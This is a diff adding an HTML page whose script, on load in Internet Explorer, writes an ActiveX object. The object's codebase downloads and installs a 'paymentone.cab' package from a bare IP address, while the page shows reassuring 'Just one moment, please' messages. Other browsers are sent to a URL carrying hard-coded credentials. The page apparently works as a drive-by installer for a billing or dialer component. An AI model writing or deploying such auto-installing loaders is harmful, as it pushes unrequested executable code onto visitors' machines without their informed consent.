@@ -1,0 +1,39 @@
+<html>
+<BODY>
+
+
+
+<script language="JavaScript">
+var dlUser = "demouser";
+var dlPass = "demopass"
+var dlURL="http://204.177.92.68/ven/netlovematch.jhtml?su="+dlUser+"&sp="+dlPass;
+
+
+function onAxNoOrNS()
+{ 
+	document.location = dlURL;  
+}
+if(navigator.appName=="Microsoft Internet Explorer")
+{
+     strOBJECT =  "<OBJECT classid=\"clsid:7BB1E467-3EEC-47c2-AB82-DF3ADF5948F1\"\n";
+     strOBJECT += " codebase=\"http://207.17.53.248/p1/paymentone.cab#version=1,0,0,20\"\n";
+     strOBJECT += " id=\"Catalog\"\n";
+     strOBJECT += " onError=\"onAxNoOrNS()\"\n";
+     strOBJECT += " height=\"50\"\n";
+     strOBJECT += " width=\"300\"\n";
+     strOBJECT += " align=\"center\"\n";
+     strOBJECT += " vspace=\"0\">\n\n";
+     strOBJECT += " <PARAM NAME=\"DownloadMsg\" value=\"Thank you&Just one moment, please&Persian Connections&Done\">\n";
+     strOBJECT += " <PARAM NAME=\"DownloadCompleteNav\" value=\"\">\n";
+     strOBJECT += " <PARAM NAME=\"DownloadURL\" value=\"" + dlURL + "\">\n";
+     strOBJECT += " </OBJECT>";
+     document.write(strOBJECT);
+} else
+     onAxNoOrNS();
+
+</script>
+
+
+
+</BODY>
+</HTML>
